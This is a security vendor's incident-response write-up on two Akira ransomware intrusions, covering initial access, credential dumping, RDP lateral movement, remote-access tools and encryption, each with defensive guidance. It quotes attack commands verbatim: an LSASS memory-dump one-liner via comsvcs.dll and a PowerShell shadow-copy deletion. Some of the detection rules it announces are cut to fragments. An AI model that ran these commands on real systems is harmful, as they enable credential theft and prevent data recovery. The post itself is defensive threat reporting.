Paul Jaramillo May 9, 2023

On April 6, 2023, the Sophos Incident Response team was engaged to support a
ransomware victim organization in North America. The following week on April 12, 2023, yet
another North American organization contacted Sophos for assistance.

While the incidents appeared to be the work of two different criminal actors, both deployed a
recently emerged ransomware called Akira. In both cases, the affected organizations had
files encrypted with the “.akira” extensions and had nearly identical ransom note files, named
fn.txt, dropped in the process (as shown below in Figure 1].

Figure 1: “fn.txt” ransomware notice

This Akira ransomware bears no code similarity to a previous ransomware strain with the
same name that was active in 2017 and is likely unrelated. The new jQuery-based leak site
(Figure 2), with its retro green colors, has garnered most of the attention, as it accepts
commands instead of listing out information.

However, cool as their leak site design may be, this matters none to victims of this
ransomware, which regrettably includes a daycare service in Canada. While the total number
of victim organizations (Figure 3) are still relatively small in comparison to Lockbit or
BlackCat/APLHV, that is how all new ransomware families begin.

Figure 3: Timeline analysis of Akira victims
In this blog post, we will compare two separate incident attack flows, illustrating how different
threat actors are deploying Akira ransomware. Please note that available data on the second
incident is limited, but we are highlighting deviations between the two incidents. This
information will provide organizations with detailed guidance on what they need to defend
against to protect their businesses.

Attack Flow Details

Initial Access

Incident #1
A user account purposedly configured to allow for Multi-Factor Authentication (MFA) bypass.

[T1078 – Valid Accounts] [T1133 – External Remote Service]

External IP access from the threat actor was routed through European TOR VPN exit
nodes.

Incident #2
VPN access using Single Factor authentication.

[T1078 – Valid Accounts] [T1133 – External Remote Service]

Guidance

3/13



Replacing password-only authentication with MFA remains one of the highest return-on-
investment (ROI) security controls, however special attention must be given to auditing for
any accounts with bypass exceptions. Also, its recommended that organizations block any
inbound traffic from TOR networks where perimeter controls are available.

Credential Access

Incident #1
Minidump of LSASS process memory leveraging comsvcs.dll with proxy execution by
rundll32.exe.

[T1003.001 – OS Credential Dumping: LSASS Memory] [T1569 – System Services]

Service Name: TcwvBcuf 

Action: %COMSPEC% /Q /c cmD.Exe /Q /c for /f ""tokens=1,2 delims= "" ^%A in 
('""tasklist /fi ""Imagename eq lsass.exe"" | find ""lsass""""')  
do rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\FP4.docx 
full"

The use of a .docx extension is not as common as .dmp or .txt
The service name is a random eight characters and different strings were observed
across different systems.

Credential access activity also occurred over the network, as this Sophos endpoint detection
indicates:

'Creds_4h (T1003.002)' malicious behaviour detected in 
'C:\Windows\System32\svchost.exe'

Incident #2
While execution details are limited, multiple systems had the file
C:\Windows\MEMORY.DMP created prior to ransomware execution correlating with
Windows event log data.

[T1003.001 – OS Credential Dumping: LSASS Memory] [T1569 – System Services]

[4656 / 0x1230] Source Name: Microsoft-Windows-Security-Auditing Strings: ['S-1-5-18’

'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'  '-']

Guidance

4/13



Dumping process memory to obtain credentials is a pervasive technique observed in most
ransomware incidents. Aside from ensuring full coverage of your endpoint agent, special
care should be taken to segment domain admin accounts from workstation admin accounts
to reduce the impact of credential dumping when it does occur. This is also a great candidate
for a repeatable hunt, using a structured method to look for variations in the pre- and post-
dumping activity that may have bypassed your existing detections. Listed below is a Sigma
rule that can be used by defenders to detect or hunt on the credential access technique used
above.

Discovery

Incident #1
Conducting discovery indirectly via schedule tasks named “Windows Update” performing
remote directory listings.

[T1083 – File and Directory Discovery] [T1053.005 – Scheduled Task/Job: Scheduled Task]

C:\>type c:\programdata\HP\ms.bat

The threat actor initially searched online for the tool before staging it for future
downloads using a public cloud hosting service.

Incident #2
Utilization of a dual-use tool, Advanced IP Scanner, to discover other systems and networks.

The threat actor accessed the decryption key to facilitate gaining reconnaissance
information without doing any noisy discovery scanning.

Guidance
Understanding the intention of a dual-use tool being executed is challenging; however, it’s
best practice to document which tools are approved for corporate use and block all others by
default until they can be reviewed. This has the added benefit of reducing shadow IT risk as

well. Additionally, just like high value business data, access to both the tool and the output of
vulnerability scanners and asset discovery applications should be restricted and audited. We
have also included an example Sigma detection rule for the activity shown in incident #1.

Lateral Movement

Incident #1
There were no network restrictions on Remote Desktop Protocol (RDP), and the threat actor
was able to move freely across the network; as a result, this activity was captured by multiple
event types.

</Event>"

Incident #2
Similar to Incident #1, the threat actor was able to RDP unencumbered across the
organization’s infrastructure.

Guidance
Securing RDP access can be difficult for many companies, but it is a project worthy of
investment. The first item to check off the box is to restrict by role, which accounts can
access other systems using RDP. The overwhelming majority of users do not need this
access. Secondly, adopting a centralized jump server, which only admins can access with
MFA and blocking at the network level other system to system RDP is a strong preventative
control. Lastly, a detection should be in place to promptly review anomalous RDP
connections to deconflict them with approved system administration activity.

Defense Evasion

Incident #1

8/13



The threat actor executed two actions to bypass Windows Defender

[T1562.001 – Impair Defenses: Disable or Modify Tools]

5001 - Real-time Protection was disabled 
New Value">HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\ 

Guidance
The first line of defense available to organizations is to use a security agent that has robust
tamper protection. In terms of monitoring for this activity, these are detection-ready event
sources. While its possible a system administrator would make such exceptions during
troubleshooting, given the risk of this activity, it’s something that should be investigated
promptly if a corresponding support ticket isn’t found.

Command and Control

Incident #1
During this incident, the threat actor leveraged one of the most popular dual-use agents,
AnyDesk, to provide persistent remote access into the affected organization on multiple
systems.

[T1219 – Remote Access Software]

UserAssist entry: 86 Value name: C:\Users\administrator.<Redacted>

[serial number: 0x7077BC2C  device path: \VOLUME{01cf89bc76f2a351-7077bc2c}]

Incident #2

The threat actor almost immediately installed Cloudflare’s freely available tunnelling software
here, C:\ProgramData\windows_update.exe, followed by the download and execution of
another dual-use agent, Radmin

hxxps://download[.]radmin[.]com/download/files/Radmin_3.5.2.1_EN[.]zip 
(Radmin_3.5.2.1_EN.zip)

A feature of Advanced IP Scanner is integration with Radmin to provide remote access
to scanned systems

Guidance
Just as with the discovery activity, threat actor usage of dual-use agents is both
commonplace and important to disrupt. All non-approved remote access solutions should be
blocked by default by an application control capability. Aside from allowing command and
control (C2) and data exfiltration opportunities for an attacker, there is also a latent risk of the
software itself having vulnerabilities and being unpatched because it’s not being managed by
IT.

Collection

Incident #2
A confirmed compromised account was used to download the WinRar archiving software and
several files were staged for possible, but unconfirmed exfiltration

[T1560.001 – Archive Collected Data: Archive via Utility]

URL Visited: E:/<Redacted>Dept.rar 
URL Visited: E:/<Redacted>Channel.rar 

Guidance
Often by the time a threat actor is staging data, it’s too late to have a good security outcome.
A good approach to prevent theft of data is to adopt least privilege access, which means
ensuring only the required people have access, followed by granular controls on exporting,
sharing, or moving the files. DLP solutions, while having a history of being difficult to
implement and maintain, are worth evaluating for high-risk data.

Impact
10/13



Incident #1
C:\ProgramData\Update.bat file executed the ransomware binary dllhost32.exe, which is
detected as Troj/Ransom-GWA by Sophos (Figure 4)

[T11486 – Data Encrypted for Impact] [T1490 – Inhibit System Recovery]

dllhost32.exe -n=10 -s=C:\ESD\sharez.txt 

dllhost32.exe -n=1 -s=C:\program files\sharez.txt 

powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"

–n option is for encryption percentage, the attacker used different settings during the
incident
-s option is for –share_file, there is a –p option for –encryption_path
Removing the shadow copies prevents recovery using native Window’s features and
Sophos detects this as Impact_6a.
Creates the C:\fn.txt or C:\etc\fn.txt ransom note when complete
Dwell time of 7 days before executing ransomware

On endpoints protected with Sophos the following detections triggered:

CryptoGuard detected ransomware in C:\ProgramData\dllhost32.exe 
'Cleanup_1a (T1486)' malicious behavior detected in 'C:\ProgramData\dllhost32.exe' 

Incident #2
Ransomware binary C:\ProgramData\hpupdate.exe is executed and detected as
Troj/Ransom-GWG by Sophos

[T11486 – Data Encrypted for Impact] [T1490 – Inhibit System Recovery]

Creates the C:\fn.txt ransom note when complete
Dwell time of 30+ days before executing ransomware

As previously reported by Bleeping Computer,  Akira targets 26 specific file extensions for
encryption. These extensions are predominantly related to databases, but also include
targeting of virtual memory and disk images. Notably, it it does not target PDFs or typical
Microsoft Office file types:

.abcddb .accdb .accde .accdc .accdt .accdr

.accdw .accft .dacpac .daschema .dadiagram .db-shm

11/13



.db-wal .fmpsl .fmp12 .kexic .kexis .nrmlib

.sas7bdat .sqlite .sqlitedb .sqlite3 .xmlff .nvram

.subvol .qcow2

SophosLabs researchers have also confirmed which file extensions are avoided by Akira in
order to not impact system stability.

Figure 5: File types excluded by

Akira

Guidance
As mentioned earlier, at this late stage in the attack, having full coverage on all systems with
a properly configured XDR solution is vital to protect organizations from ransomware. In the
case of Sophos, it’s critical for customers to have their CryptoGuard policy activated, which is
something support can guide customers on. We have also provided the YARA rule below,
which can be used to identify Akira ransomware binaries.

   $s4 or $s5) 
}

Please be aware that threat actors will continue to modify the code, which was evident when
we uncovered the following new file name being used “readme-asldkas.txt”.

Conclusion
Sophos MDR is sharing this information with the specific goal of aiding defenders in the
seemingly never-ending battle with ransomware threat groups. Through each of the covered
steps in the attack flow, specific guidance is provided to drive actions with context. Aside
from the differences in C2 tools used (AnyDesk vs Cloudflared), one of the key points to
highlight is the dwell time. Incident #1 had a dwell time of 7 days compared to incident #2
with over 30 days of dwell time. Both of these events demonstrate a slower operational
tempo, which bodes well for defenders having opportunities to disrupt in-flight compromises.
The time from initial access to ransomware impact is indicative of the complex e-crime
ecosystem, where there are distributors, initial access brokers, malware developers, and
ransomware affiliates working together from resource development to payment.
Unfortunately, there are some edge cases where organizations have had their files encrypted
within just 24 hours, and that type of threat really does require an experienced, global
partner, such as Sophos, to augment your security program.
